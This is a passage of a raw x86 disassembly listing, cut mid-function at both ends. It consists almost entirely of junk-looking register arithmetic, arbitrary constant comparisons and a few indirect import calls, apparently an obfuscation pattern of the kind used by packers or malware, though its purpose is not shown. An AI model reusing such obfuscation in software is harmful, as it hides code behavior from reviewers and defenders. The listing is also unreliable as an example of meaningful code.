  423c0d:	add    edi,eax
  423c0f:	add    DWORD PTR [ebp-0x24],edi
  423c12:	sub    esi,ebx
  423c14:	mov    ecx,DWORD PTR [ebp-0x24]
  423c17:	mov    edx,DWORD PTR ds:0x43804c
  423c1d:	cmp    esi,0x42
  423c20:	jne    0x423c85
  423c22:	mov    edi,DWORD PTR [ebp-0x24]
  423c25:	mov    ebx,edx
  423c27:	add    edi,ebx
  423c29:	or     edi,ebx
  423c2b:	sub    ecx,edx
  423c2d:	mov    DWORD PTR [ebp-0x2c],esi
  423c30:	cmp    ecx,0xffffffbb
  423c33:	jne    0x423c85
  423c35:	cmp    edi,0xffffffb7
  423c38:	je     0x423c85
  423c3a:	and    edi,edx
  423c3c:	or     DWORD PTR [ebp-0x2c],eax
  423c3f:	add    edi,edi
  423c41:	cmp    edi,DWORD PTR ds:0x43804c
  423c47:	jne    0x423c85
  423c49:	add    DWORD PTR [ebp-0x2c],edi
  423c4c:	add    DWORD PTR [ebp-0x24],edi
  423c4f:	sub    ecx,ebx
  423c51:	mov    esi,DWORD PTR [ebp-0x24]
  423c54:	mov    ebx,DWORD PTR [ebp-0x2c]
  423c57:	add    ecx,edx
  423c59:	or     DWORD PTR [ebp-0x2c],ebx
  423c5c:	mov    DWORD PTR [ebp-0x24],ecx
  423c5f:	and    DWORD PTR [ebp-0x2c],edi
  423c62:	or     DWORD PTR [ebp-0x2c],edi
  423c65:	cmp    esi,DWORD PTR ds:0x43804c
  423c6b:	jne    0x423c85
  423c6d:	mov    eax,0x1b
  423c72:	mov    ebx,0x1528
  423c77:	xor    DWORD PTR [ebp-0x24],eax
  423c7a:	sub    DWORD PTR [ebp-0x2c],edx
  423c7d:	add    DWORD PTR [ebp-0x2c],ebx
  423c80:	and    esi,eax
  423c82:	add    DWORD PTR [ebp-0x24],esi
  423c85:	sub    edi,edx
  423c87:	add    edi,edx
  423c89:	mov    eax,DWORD PTR [ebp-0x24]
  423c8c:	sub    eax,edi
  423c8e:	mov    DWORD PTR [ebp-0x24],eax
  423c91:	sub    esi,edx
  423c93:	add    esi,edx
  423c95:	mov    edx,DWORD PTR [ebp-0x24]
  423c98:	mov    ecx,DWORD PTR ds:0x438080
  423c9e:	sub    ecx,esi
  423ca0:	add    edx,ecx
  423ca2:	cmp    edx,edi
  423ca4:	je     0x423ca9
  423ca6:	sub    DWORD PTR [ebp-0x24],edx
  423ca9:	mov    eax,DWORD PTR [ebp-0x24]
  423cac:	cmp    eax,ecx
  423cae:	je     0x423cb3
  423cb0:	add    DWORD PTR [ebp-0x24],eax
  423cb3:	mov    edx,0xfe01
  423cb8:	sub    DWORD PTR [ebp-0x24],ecx
  423cbb:	add    DWORD PTR [ebp-0x24],edx
  423cbe:	xor    DWORD PTR [ebp-0x24],edx
  423cc1:	mov    edi,0xb3
  423cc6:	sub    edi,esi
  423cc8:	add    DWORD PTR [ebp-0x24],ebx
  423ccb:	mov    esi,DWORD PTR ds:0x438090
  423cd1:	add    DWORD PTR [ebp-0x24],esi
  423cd4:	mov    DWORD PTR [ebp-0x24],edi
  423cd7:	sub    eax,edx
  423cd9:	test   eax,0xb0
  423cde:	jne    0x423d43
  423ce0:	cmp    edi,0xc557
  423ce6:	je     0x423d43
  423ce8:	add    eax,eax
  423cea:	and    eax,esi
  423cec:	or     eax,ebx
  423cee:	mov    esi,ebx
  423cf0:	add    DWORD PTR [ebp-0x24],esi
  423cf3:	mov    esi,DWORD PTR [ebp-0x24]
  423cf6:	cmp    esi,0x70fd
  423cfc:	jne    0x423d43
  423cfe:	cmp    edi,0xffffffc2
  423d01:	jne    0x423d43
  423d03:	mov    ebx,0xd2df
  423d08:	and    esi,eax
  423d0a:	test   esi,0xe5
  423d10:	je     0x423d43
  423d12:	sub    esi,edx
  423d14:	mov    ecx,DWORD PTR [ebp-0x24]
  423d17:	add    DWORD PTR [ebp-0x24],esi
  423d1a:	and    ecx,eax
  423d1c:	sub    ecx,esi
  423d1e:	add    DWORD PTR [ebp-0x24],edx
  423d21:	and    DWORD PTR [ebp-0x24],ecx
  423d24:	add    ebx,edx
  423d26:	and    ebx,ecx
  423d28:	mov    edi,DWORD PTR [ebp-0x24]
  423d2b:	sub    DWORD PTR [ebp-0x24],ebx
  423d2e:	test   edi,0x34e24800
  423d34:	jne    0x423d43
  423d36:	sub    edi,eax
  423d38:	cmp    edi,DWORD PTR ds:0x438090
  423d3e:	je     0x423d43
  423d40:	add    DWORD PTR [ebp-0x24],edi
  423d43:	mov    ebx,DWORD PTR [ebp-0x24]
  423d46:	test   ebx,0xc8
  423d4c:	jne    0x423dcd
  423d4e:	add    ebx,esi
  423d50:	mov    edi,0x54500462
  423d55:	mov    esi,DWORD PTR [ebp-0x24]
  423d58:	cmp    esi,0x44
  423d5b:	jne    0x423dcd
  423d5d:	sub    DWORD PTR [ebp-0x24],esi
  423d60:	cmp    ebx,DWORD PTR [ebp-0x4]
  423d63:	je     0x423dcd
  423d65:	cmp    ebx,0xffffffca
  423d68:	je     0x423dcd
  423d6a:	mov    eax,DWORD PTR [ebp-0x24]
  423d6d:	mov    edx,DWORD PTR [ebp-0x24]
  423d70:	and    ebx,edx
  423d72:	sub    DWORD PTR [ebp-0x24],edi
  423d75:	cmp    ebx,0xb
  423d78:	je     0x423dcd
  423d7a:	add    eax,edx
  423d7c:	xor    ecx,ecx
  423d7e:	cmp    eax,0xfffffff2
  423d81:	jne    0x423dcd
  423d83:	test   eax,0x81
  423d88:	jne    0x423dcd
  423d8a:	xor    DWORD PTR [ebp-0x24],eax
  423d8d:	test   ebx,0x4a
  423d93:	jne    0x423dcd
  423d95:	mov    edi,0x4aa2241
  423d9a:	mov    esi,ecx
  423d9c:	or     DWORD PTR [ebp-0x24],edi
  423d9f:	and    ebx,eax
  423da1:	add    esi,esi
  423da3:	test   ebx,0xa0
  423da9:	jne    0x423dcd
  423dab:	mov    ecx,DWORD PTR [ebp-0x24]
  423dae:	mov    esi,DWORD PTR [ebp-0x24]
  423db1:	add    esi,edi
  423db3:	cmp    esi,eax
  423db5:	jne    0x423dcd
  423db7:	add    DWORD PTR [ebp-0x24],ebx
  423dba:	mov    ebx,DWORD PTR [ebp-0x24]
  423dbd:	add    DWORD PTR [ebp-0x24],esi
  423dc0:	mov    eax,edi
  423dc2:	sub    DWORD PTR [ebp-0x24],ebx
  423dc5:	mov    DWORD PTR [ebp-0xc],ecx
  423dc8:	sub    ecx,eax
  423dca:	add    DWORD PTR [ebp-0x24],ecx
  423dcd:	cmp    ebx,DWORD PTR ds:0x438090
  423dd3:	je     0x423eef
  423dd9:	mov    ecx,DWORD PTR [ebp-0x24]
  423ddc:	add    ecx,esi
  423dde:	mov    ebx,DWORD PTR [ebp-0x24]
  423de1:	cmp    ebx,DWORD PTR [ebp-0x8]
  423de4:	je     0x423eef
  423dea:	mov    edi,0x82
  423def:	add    edi,ecx
  423df1:	mov    edx,DWORD PTR [ebp-0x24]
  423df4:	add    edx,edi
  423df6:	test   ebx,0xf7
  423dfc:	jne    0x423eef
  423e02:	cmp    ebx,DWORD PTR [ebp-0x4]
  423e05:	je     0x423eef
  423e0b:	test   ecx,0x7792
  423e11:	je     0x423eef
  423e17:	mov    eax,0x6c
  423e1c:	xor    edi,edi
  423e1e:	test   edx,0x690b402
  423e24:	je     0x423eef
  423e2a:	add    DWORD PTR [ebp-0x24],eax
  423e2d:	add    edi,edi
  423e2f:	mov    esi,DWORD PTR ds:0x438080
  423e35:	or     edx,eax
  423e37:	mov    eax,DWORD PTR ds:0x438098
  423e3d:	sub    DWORD PTR [ebp-0x24],ebx
  423e40:	add    edx,ebx
  423e42:	test   edx,0x99
  423e48:	jne    0x423eef
  423e4e:	add    edx,ecx
  423e50:	and    edx,eax
  423e52:	xor    ecx,ecx
  423e54:	cmp    edx,0x3cef
  423e5a:	jne    0x423eef
  423e60:	mov    eax,DWORD PTR ds:0x438098
  423e66:	mov    ebx,DWORD PTR [ebp-0x24]
  423e69:	cmp    ebx,DWORD PTR ds:0x438098
  423e6f:	je     0x423eef
  423e71:	or     DWORD PTR [ebp-0x24],eax
  423e74:	cmp    ebx,eax
  423e76:	je     0x423eef
  423e78:	mov    esi,DWORD PTR [ebp-0x24]
  423e7b:	mov    eax,DWORD PTR [ebp-0x24]
  423e7e:	add    edx,ebx
  423e80:	add    DWORD PTR [ebp-0x24],ecx
  423e83:	cmp    edx,DWORD PTR ds:0x43804c
  423e89:	jne    0x423eef
  423e8b:	add    DWORD PTR [ebp-0x24],eax
  423e8e:	xor    ebx,ebx
  423e90:	cmp    edx,DWORD PTR [ebp-0xc]
  423e93:	jne    0x423eef
  423e95:	mov    ecx,DWORD PTR ds:0x438080
  423e9b:	mov    DWORD PTR [ebp-0x24],esi
  423e9e:	mov    eax,DWORD PTR [ebp-0x24]
  423ea1:	sub    DWORD PTR [ebp-0x24],edi
  423ea4:	cmp    eax,0xffffffa4
  423ea7:	je     0x423eef
  423ea9:	add    eax,edi
  423eab:	xor    esi,esi
  423ead:	mov    edi,DWORD PTR [ebp-0x24]
  423eb0:	add    ebx,edx
  423eb2:	sub    esi,ebx
  423eb4:	test   esi,0x25
  423eba:	jne    0x423eef
  423ebc:	sub    edi,esi
  423ebe:	or     edi,ebx
  423ec0:	add    DWORD PTR [ebp-0x24],eax
  423ec3:	add    DWORD PTR [ebp-0x24],edx
  423ec6:	and    edi,ebx
  423ec8:	sub    edi,ebx
  423eca:	xor    DWORD PTR [ebp-0x24],ecx
  423ecd:	sub    DWORD PTR [ebp-0x24],ecx
  423ed0:	cmp    ebx,0xffffff9f
  423ed3:	je     0x423eef
  423ed5:	mov    edx,DWORD PTR [ebp-0x24]
  423ed8:	mov    eax,0xe8
  423edd:	and    DWORD PTR [ebp-0x24],edx
  423ee0:	test   edi,0xea73
  423ee6:	je     0x423eef
  423ee8:	cmp    edi,eax
  423eea:	je     0x423eef
  423eec:	or     DWORD PTR [ebp-0x24],edi
  423eef:	mov    edi,0xc5
  423ef4:	mov    esi,DWORD PTR ds:0x438090
  423efa:	and    esi,ecx
  423efc:	sub    DWORD PTR [ebp-0x24],edi
  423eff:	sub    DWORD PTR [ebp-0x24],esi
  423f02:	mov    esi,DWORD PTR [ebp-0x24]
  423f05:	sub    DWORD PTR [ebp-0x24],esi
  423f08:	mov    edi,DWORD PTR [ebp-0x24]
  423f0b:	cmp    ebx,0xffffffba
  423f0e:	jne    0x423f30
  423f10:	add    edi,ecx
  423f12:	mov    esi,0xb8
  423f17:	add    DWORD PTR [ebp-0x24],edi
  423f1a:	mov    edx,0x82
  423f1f:	add    esi,ecx
  423f21:	and    DWORD PTR [ebp-0x24],edx
  423f24:	cmp    ebx,0x59
  423f27:	je     0x423f30
  423f29:	add    eax,esi
  423f2b:	add    eax,esi
  423f2d:	sub    DWORD PTR [ebp-0x24],eax
  423f30:	cmp    edi,0x7d6d
  423f36:	jne    0x423f3b
  423f38:	and    DWORD PTR [ebp-0x24],ebx
  423f3b:	mov    esi,DWORD PTR [ebp-0x24]
  423f3e:	or     DWORD PTR [ebp-0x24],esi
  423f41:	add    DWORD PTR [ebp-0x24],esi
  423f44:	push   0x438098
  423f49:	call   DWORD PTR ds:0x435a74
  423f4f:	mov    ecx,DWORD PTR [ebp-0x24]
  423f52:	xor    edi,edi
  423f54:	cmp    esi,0xffffffdd
  423f57:	jne    0x423fd0
  423f59:	mov    esi,DWORD PTR [ebp-0x24]
  423f5c:	add    DWORD PTR [ebp-0x24],ecx
  423f5f:	mov    ebx,ecx
  423f61:	sub    DWORD PTR [ebp-0x24],esi
  423f64:	sub    ebx,edi
  423f66:	cmp    ebx,DWORD PTR [ebp-0x2c]
  423f69:	jne    0x423fd0
  423f6b:	add    ebx,eax
  423f6d:	mov    edi,DWORD PTR [ebp-0x24]
  423f70:	mov    esi,DWORD PTR [ebp-0x24]
  423f73:	test   esi,0x3a
  423f79:	je     0x423fd0
  423f7b:	mov    edx,0x84
  423f80:	test   ebx,0xe0
  423f86:	jne    0x423fd0
  423f88:	sub    esi,ecx
  423f8a:	mov    ecx,0xbe
  423f8f:	mov    DWORD PTR [ebp-0x24],esi
  423f92:	sub    edx,eax
  423f94:	mov    esi,DWORD PTR ds:0x438044
  423f9a:	sub    DWORD PTR [ebp-0x24],ebx
  423f9d:	or     edx,eax
  423f9f:	sub    ecx,ebx
  423fa1:	add    edx,esi
  423fa3:	sub    edi,ecx
  423fa5:	cmp    edx,0xe7d2
  423fab:	je     0x423fd0
  423fad:	cmp    edi,ecx
  423faf:	jne    0x423fd0
  423fb1:	cmp    edi,DWORD PTR [ebp-0x34]
  423fb4:	je     0x423fd0
  423fb6:	add    DWORD PTR [ebp-0x24],edi
  423fb9:	mov    edi,DWORD PTR [ebp-0x24]
  423fbc:	sub    DWORD PTR [ebp-0x24],edi
  423fbf:	mov    ebx,DWORD PTR ds:0x438080
  423fc5:	xor    DWORD PTR [ebp-0x24],ebx
  423fc8:	cmp    edx,DWORD PTR [ebp-0x30]
  423fcb:	jne    0x423fd0
  423fcd:	or     DWORD PTR [ebp-0x24],edx
  423fd0:	cmp    eax,DWORD PTR ds:0x438098
  423fd6:	je     0x424133
  423fdc:	add    DWORD PTR [ebp-0x24],edx
  423fdf:	mov    esi,0xac
  423fe4:	sub    edx,ecx
  423fe6:	mov    ebx,DWORD PTR [ebp-0x24]
  423fe9:	mov    edi,0x4b
  423fee:	sub    edi,ecx
  423ff0:	sub    edi,eax
  423ff2:	add    DWORD PTR [ebp-0x24],edi
  423ff5:	sub    ebx,edi
  423ff7:	sub    ebx,eax
  423ff9:	cmp    ebx,eax
  423ffb:	je     0x424038
  423ffd:	sub    edx,ebx
  423fff:	cmp    edx,eax
  424001:	jne    0x424038
  424003:	and    edx,ebx
  424005:	add    edx,edi
  424007:	add    DWORD PTR [ebp-0x24],esi
  42400a:	mov    ecx,0x96
  42400f:	sub    edx,esi
  424011:	mov    eax,DWORD PTR [ebp-0x24]
  424014:	add    DWORD PTR [ebp-0x24],esi
  424017:	sub    edx,ebx
  424019:	add    eax,edx
  42401b:	or     DWORD PTR [ebp-0x24],esi
  42401e:	cmp    ebx,edx
  424020:	je     0x424038
  424022:	add    ecx,edx
  424024:	mov    ebx,esi
  424026:	sub    eax,edx
  424028:	sub    ebx,ecx
  42402a:	mov    edi,DWORD PTR [ebp-0x24]
  42402d:	or     DWORD PTR [ebp-0x24],ebx
  424030:	sub    DWORD PTR [ebp-0x24],eax
  424033:	sub    edi,edx
  424035:	sub    DWORD PTR [ebp-0x24],edi
  424038:	and    DWORD PTR [ebp-0x24],ebx
  42403b:	xor    edx,edx
  42403d:	sub    DWORD PTR [ebp-0x24],esi
  424040:	add    eax,ebx
  424042:	mov    ecx,DWORD PTR [ebp-0x24]
  424045:	add    DWORD PTR [ebp-0x24],eax
  424048:	add    ecx,edx
  42404a:	mov    ebx,0xbb
  42404f:	sub    DWORD PTR [ebp-0x24],ecx
  424052:	add    DWORD PTR [ebp-0x24],ebx
  424055:	sub    edx,esi
  424057:	mov    ecx,0x27
  42405c:	sub    DWORD PTR [ebp-0x24],edx
  42405f:	mov    eax,ebx
  424061:	sub    eax,edx
  424063:	add    DWORD PTR [ebp-0x24],ecx
  424066:	sub    eax,edx
  424068:	sub    DWORD PTR [ebp-0x24],eax
  42406b:	mov    eax,DWORD PTR [ebp-0x24]
  42406e:	sub    DWORD PTR [ebp-0x24],eax
  424071:	and    esi,edx
  424073:	mov    edx,DWORD PTR ds:0x43804c
  424079:	cmp    edi,0x1cef
  42407f:	je     0x424084
  424081:	mov    DWORD PTR [ebp-0x24],eax
  424084:	add    edx,edx
  424086:	and    DWORD PTR [ebp-0x24],edx
  424089:	or     DWORD PTR [ebp-0x24],esi
  42408c:	add    esi,esi
  42408e:	add    edx,ebx
  424090:	add    DWORD PTR [ebp-0x24],esi
  424093:	sub    edx,ecx
  424095:	add    edx,edi
  424097:	mov    ecx,DWORD PTR [ebp-0x24]
  42409a:	xor    DWORD PTR [ebp-0x24],eax
  42409d:	add    edx,ebx
  42409f:	mov    edi,0xbe
  4240a4:	add    edx,edx
  4240a6:	sub    edi,eax
  4240a8:	sub    DWORD PTR [ebp-0x24],ecx
  4240ab:	sub    DWORD PTR [ebp-0x24],edi
  4240ae:	sub    edx,ebx
  4240b0:	sub    edx,eax
  4240b2:	sub    DWORD PTR [ebp-0x24],edx
  4240b5:	mov    edi,0xc49f
  4240ba:	mov    ecx,DWORD PTR [ebp-0x24]
  4240bd:	cmp    ecx,DWORD PTR ds:0x43804c
  4240c3:	je     0x424114
  4240c5:	mov    ebx,DWORD PTR [ebp-0x24]
  4240c8:	cmp    ebx,DWORD PTR ds:0x438080
  4240ce:	je     0x424114
  4240d0:	cmp    ecx,0x65
  4240d3:	jne    0x424114
  4240d5:	mov    edx,DWORD PTR [ebp-0x24]
  4240d8:	and    DWORD PTR [ebp-0x24],ebx
  4240db:	cmp    edx,DWORD PTR ds:0x43804c
  4240e1:	jne    0x424114
  4240e3:	mov    eax,0x2ae9
  4240e8:	test   ecx,0xc0198220
  4240ee:	jne    0x424114
  4240f0:	cmp    edx,ebx
  4240f2:	je     0x424114
  4240f4:	xor    ebx,ebx
  4240f6:	xor    DWORD PTR [ebp-0x24],esi
  4240f9:	add    DWORD PTR [ebp-0x24],ecx
  4240fc:	mov    ecx,DWORD PTR ds:0x438088
  424102:	or     DWORD PTR [ebp-0x24],edx
  424105:	add    eax,ecx
  424107:	add    DWORD PTR [ebp-0x24],eax
  42410a:	sub    edi,ebx
  42410c:	add    ecx,ecx
  42410e:	add    DWORD PTR [ebp-0x24],edi
  424111:	and    DWORD PTR [ebp-0x24],ecx
  424114:	mov    DWORD PTR [ebp-0x10],esi
  424117:	mov    ebx,DWORD PTR ds:0x438044
  42411d:	mov    ecx,0x273a
  424122:	sub    ecx,eax
  424124:	add    ebx,ebx
  424126:	add    DWORD PTR [ebp-0x24],ebx
  424129:	sub    edi,esi
  42412b:	and    ecx,eax
  42412d:	add    DWORD PTR [ebp-0x24],ecx
  424130:	add    DWORD PTR [ebp-0x24],edi
  424133:	xor    esi,esi
  424135:	sub    esi,edi
  424137:	add    esi,edi
  424139:	or     DWORD PTR [ebp-0x24],esi
  42413c:	add    DWORD PTR [ebp-0x24],edi
  42413f:	call   DWORD PTR ds:0x435a08
  424145:	mov    edi,0xc9
  42414a:	mov    ebx,DWORD PTR ds:0x43804c
  424150:	xor    DWORD PTR [ebp-0x24],esi
  424153:	and    edi,ebx
  424155:	sub    edi,ebx
  424157:	add    DWORD PTR [ebp-0x24],edi
  42415a:	mov    DWORD PTR [ebp-0x34],eax
  42415d:	mov    eax,DWORD PTR [ebp-0x24]
  424160:	add    eax,edi
  424162:	cmp    eax,0x5d
  424165:	jne    0x4241c9
  424167:	mov    ecx,DWORD PTR [ebp-0x24]
  42416a:	mov    edx,DWORD PTR [ebp-0x24]
  42416d:	or     edx,esi
  42416f:	cmp    ecx,0xcf4f
  424175:	jne    0x4241c9
  424177:	or     eax,edi
  424179:	xor    DWORD PTR [ebp-0x24],ecx
  42417c:	mov    esi,0x44d91069
  424181:	xor    ecx,ecx
  424183:	sub    DWORD PTR [ebp-0x24],ecx
  424186:	sub    esi,eax
  424188:	cmp    edx,eax
  42418a:	je     0x4241c9
  42418c:	add    edx,edx
  42418e:	mov    ecx,0x5b
  424193:	mov    DWORD PTR [ebp-0x24],edx
  424196:	add    esi,eax
  424198:	sub    DWORD PTR [ebp-0x24],ebx
  42419b:	mov    ebx,DWORD PTR [ebp-0x24]
  42419e:	cmp    esi,DWORD PTR [ebp-0x24]
  4241a1:	je     0x4241c9
  4241a3:	mov    edi,DWORD PTR [ebp-0x24]
  4241a6:	sub    DWORD PTR [ebp-0x24],ebx
  4241a9:	xor    edx,edx
  4241ab:	sub    DWORD PTR [ebp-0x24],esi
  4241ae:	and    ecx,esi
  4241b0:	add    edi,ebx
  4241b2:	add    ecx,edx
  4241b4:	and    ecx,ebx
  4241b6:	add    DWORD PTR [ebp-0x24],ecx
  4241b9:	sub    DWORD PTR [ebp-0x24],edx
  4241bc:	cmp    edi,ebx
  4241be:	jne    0x4241c9
  4241c0:	sub    edi,ecx
  4241c2:	and    edi,ebx
  4241c4:	add    edi,ecx
  4241c6:	sub    DWORD PTR [ebp-0x24],edi
  4241c9:	push   0x1b
  4241cb:	push   0x0
  4241cd:	call   DWORD PTR ds:0x435a68
  4241d3:	add    ebx,esi
  4241d5:	mov    edx,0xf7
  4241da:	mov    ecx,0xd691
  4241df:	cmp    ebx,DWORD PTR ds:0x438098
  4241e5:	je     0x424201
  4241e7:	add    DWORD PTR [ebp-0x24],ecx
  4241ea:	mov    ecx,0xc9
  4241ef:	mov    edi,0x44
  4241f4:	add    ebx,ecx
  4241f6:	add    DWORD PTR [ebp-0x24],edi
  4241f9:	and    ebx,esi
  4241fb:	xor    DWORD PTR [ebp-0x24],edx
  4241fe:	sub    DWORD PTR [ebp-0x24],ebx
  424201:	mov    DWORD PTR [ebp-0x8],eax
  424204:	xor    DWORD PTR [ebp-0x24],eax
  424207:	call   DWORD PTR ds:0x435a14
  42420d:	or     ebx,esi
  42420f:	add    ebx,esi
  424211:	mov    esi,0xc
  424216:	mov    DWORD PTR [ebp-0x24],esi
  424219:	cmp    ebx,DWORD PTR [ebp-0x28]
  42421c:	jne    0x424221
  42421e:	or     DWORD PTR [ebp-0x24],ebx
  424221:	cmp    eax,0xb57b
  424226:	jne    0x42437d
  42422c:	mov    eax,DWORD PTR [ebp-0x24]
  42422f:	mov    edi,DWORD PTR [ebp-0x24]
  424232:	add    edi,ebx
  424234:	add    DWORD PTR [ebp-0x24],edi
  424237:	test   eax,0x7f
  42423c:	jne    0x424241
  42423e:	mov    DWORD PTR [ebp-0x24],eax
  424241:	xor    edi,edi
  424243:	mov    ecx,DWORD PTR [ebp-0x24]
  424246:	and    ecx,eax
  424248:	mov    ebx,DWORD PTR ds:0x438080
  42424e:	add    ecx,eax
  424250:	add    DWORD PTR [ebp-0x24],ebx
  424253:	cmp    ecx,esi
  424255:	je     0x4242e1
  42425b:	mov    esi,0x1767
  424260:	sub    ecx,eax
  424262:	sub    DWORD PTR [ebp-0x24],edi
  424265:	cmp    ecx,0xffffff82
  424268:	je     0x4242e1
  42426a:	mov    esi,DWORD PTR [ebp-0x24]
  42426d:	mov    ebx,DWORD PTR [ebp-0x24]
  424270:	cmp    esi,DWORD PTR [ebp-0x34]
  424273:	je     0x4242e1
  424275:	mov    eax,0x46
  42427a:	and    ecx,esi
  42427c:	mov    edx,0x146d
  424281:	add    DWORD PTR [ebp-0x24],edx
  424284:	add    ecx,eax
  424286:	sub    ecx,eax
  424288:	sub    ecx,eax
  42428a:	sub    DWORD PTR [ebp-0x24],edx
  42428d:	sub    DWORD PTR [ebp-0x24],ecx
  424290:	cmp    esi,DWORD PTR [ebp-0x34]
  424293:	jne    0x4242e1
  424295:	mov    ecx,DWORD PTR [ebp-0x24]
  424298:	mov    edx,DWORD PTR [ebp-0x24]
  42429b:	and    edx,edi
  42429d:	sub    DWORD PTR [ebp-0x24],edi
  4242a0:	add    edx,ebx
  4242a2:	add    ecx,esi
  4242a4:	sub    ecx,eax
  4242a6:	cmp    ecx,0x44b60a08
  4242ac:	jne    0x4242e1
  4242ae:	cmp    ecx,0xe7ff
  4242b4:	je     0x4242e1
  4242b6:	mov    esi,DWORD PTR [ebp-0x24]
  4242b9:	cmp    esi,0x75
  4242bc:	jne    0x4242e1
  4242be:	cmp    esi,edx
  4242c0:	jne    0x4242e1
  4242c2:	mov    eax,edi
  4242c4:	cmp    esi,0x7c
  4242c7:	jne    0x4242e1
  4242c9:	mov    ebx,0xcbb2
  4242ce:	sub    ecx,ebx
  4242d0:	add    DWORD PTR [ebp-0x24],edx
  4242d3:	sub    DWORD PTR [ebp-0x24],ebx
  4242d6:	add    DWORD PTR [ebp-0x24],ecx
  4242d9:	sub    DWORD PTR [ebp-0x24],eax
  4242dc:	and    esi,edi
  4242de:	sub    DWORD PTR [ebp-0x24],esi
  4242e1:	test   esi,0x7a
  4242e7:	je     0x424313
  4242e9:	sub    edx,eax
  4242eb:	sub    edx,eax
  4242ed:	xor    ebx,ebx
  4242ef:	add    edx,edx
  4242f1:	sub    DWORD PTR [ebp-0x24],eax
  4242f4:	mov    eax,DWORD PTR [ebp-0x24]
  4242f7:	sub    edx,edi
  4242f9:	cmp    edx,0x6e
  4242fc:	je     0x424313
  4242fe:	sub    eax,ecx
  424300:	cmp    eax,ebx
  424302:	jne    0x424313
  424304:	add    eax,edx
  424306:	add    eax,edi
  424308:	sub    eax,ebx
  42430a:	cmp    eax,edi
  42430c:	jne    0x424313
  42430e:	add    eax,esi
  424310:	add    DWORD PTR [ebp-0x24],eax
  424313:	mov    ecx,DWORD PTR ds:0x43804c
  424319:	and    ebx,edx
  42431b:	add    ebx,ebx
  42431d:	add    ebx,edx
  42431f:	mov    eax,DWORD PTR [ebp-0x24]
  424322:	add    ebx,edi
  424324:	mov    edx,DWORD PTR ds:0x4380ac
  42432a:	and    ebx,esi
  42432c:	sub    DWORD PTR [ebp-0x24],ebx
  42432f:	sub    edx,ecx
  424331:	add    DWORD PTR [ebp-0x24],edi
  424334:	mov    DWORD PTR [ebp-0x24],edx
  424337:	cmp    eax,0x2a11
  42433c:	jne    0x424350
  42433e:	add    eax,ebx
  424340:	mov    esi,0x14810623
  424345:	or     esi,edx
  424347:	add    eax,esi
  424349:	sub    eax,edi
  42434b:	mov    ebx,eax
  42434d:	add    DWORD PTR [ebp-0x24],ebx
  424350:	mov    eax,0xd7
  424355:	mov    esi,ecx
  424357:	sub    DWORD PTR [ebp-0x24],edi
  42435a:	sub    eax,esi
  42435c:	sub    eax,ecx
  42435e:	sub    DWORD PTR [ebp-0x24],eax
  424361:	add    edi,ecx
  424363:	mov    DWORD PTR [ebp-0x24],edi
  424366:	mov    edx,DWORD PTR ds:0x4380ac
  42436c:	mov    ecx,0xdd
  424371:	add    DWORD PTR [ebp-0x24],ecx
  424374:	add    DWORD PTR [ebp-0x24],edx
  424377:	mov    DWORD PTR [ebp-0x28],edi
  42437a:	and    DWORD PTR [ebp-0x24],esi
  42437d:	add    esi,ecx
  42437f:	sub    esi,edi
  424381:	mov    edi,DWORD PTR [ebp-0x24]
  424384:	mov    eax,0x1a
  424389:	add    eax,eax
  42438b:	test   edi,0x5b15
  424391:	je     0x4243a3
  424393:	mov    DWORD PTR [ebp-0x24],esi
  424396:	sub    edi,ebx
  424398:	cmp    edi,DWORD PTR ds:0x438098
  42439e:	jne    0x4243a3
  4243a0:	add    DWORD PTR [ebp-0x24],edi
  4243a3:	add    eax,edx
  4243a5:	sub    eax,edi
  4243a7:	sub    DWORD PTR [ebp-0x24],eax
  4243aa:	cmp    eax,0xffffffca
  4243ad:	jne    0x4243ee
  4243af:	and    edx,eax
  4243b1:	sub    edx,ebx
  4243b3:	mov    ecx,0x2
  4243b8:	sub    DWORD PTR [ebp-0x24],edx
  4243bb:	mov    eax,DWORD PTR [ebp-0x24]
  4243be:	cmp    eax,DWORD PTR ds:0x43804c
  4243c4:	je     0x4243ee
  4243c6:	and    eax,edi
  4243c8:	mov    edx,DWORD PTR [ebp-0x24]
  4243cb:	and    ecx,edi
  4243cd:	and    edx,ebx
  4243cf:	add    edx,ecx
  4243d1:	test   eax,0x4a
  4243d6:	je     0x4243ee
  4243d8:	mov    edi,DWORD PTR ds:0x43805c
  4243de:	add    eax,edx
  4243e0:	cmp    ebx,DWORD PTR ds:0x4380ac
  4243e6:	jne    0x4243ee
  4243e8:	sub    DWORD PTR [ebp-0x24],edi
  4243eb:	and    DWORD PTR [ebp-0x24],eax
  4243ee:	xor    edx,edx
  4243f0:	sub    DWORD PTR [ebp-0x24],edx
  4243f3:	mov    edi,DWORD PTR ds:0x43804c
  4243f9:	xor    ebx,ebx
  4243fb:	mov    DWORD PTR [ebp-0x24],edi
  4243fe:	sub    DWORD PTR [ebp-0x24],ebx
  424401:	mov    ecx,0xea
  424406:	add    ecx,esi
  424408:	or     DWORD PTR [ebp-0x24],ecx
  42440b:	sub    DWORD PTR [ebp-0x24],eax
  42440e:	xor    esi,esi
  424410:	mov    edx,0xc6
  424415:	sub    DWORD PTR [ebp-0x24],esi
  424418:	sub    edx,edi
  42441a:	sub    edx,ecx
  42441c:	add    edx,esi
  42441e:	mov    DWORD PTR [ebp-0x4c],edx
  424421:	mov    eax,DWORD PTR [ebp-0x24]
  424424:	mov    edx,DWORD PTR ds:0x438080
  42442a:	cmp    eax,0xb75b
  42442f:	je     0x424444
  424431:	add    DWORD PTR [ebp-0x24],edx
  424434:	mov    edi,edx
  424436:	mov    ecx,0xc1b9
  42443b:	sub    ecx,edi
  42443d:	sub    ecx,eax
  42443f:	sub    ecx,edx
  424441:	mov    DWORD PTR [ebp-0x24],ecx
  424444:	add    DWORD PTR [ebp-0x24],esi
  424447:	mov    edi,DWORD PTR [ebp-0x24]
  42444a:	add    edi,esi
  42444c:	cmp    eax,0x97ae
  424451:	jne    0x42445a
  424453:	cmp    edi,edx
  424455:	je     0x42445a
  424457:	sub    DWORD PTR [ebp-0x4c],edi
  42445a:	cmp    edi,DWORD PTR [ebp-0x8]
  42445d:	je     0x424495
  42445f:	or     ebx,ecx
  424461:	mov    esi,DWORD PTR [ebp-0x4c]
  424464:	sub    DWORD PTR [ebp-0x24],esi
  424467:	mov    eax,DWORD PTR [ebp-0x4c]
  42446a:	cmp    eax,ebx
  42446c:	je     0x424495
  42446e:	mov    DWORD PTR [ebp-0x18],eax
  424471:	sub    ebx,ecx
  424473:	cmp    ebx,0x55
  424476:	jne    0x424495
  424478:	mov    esi,edx
  42447a:	and    ebx,edi
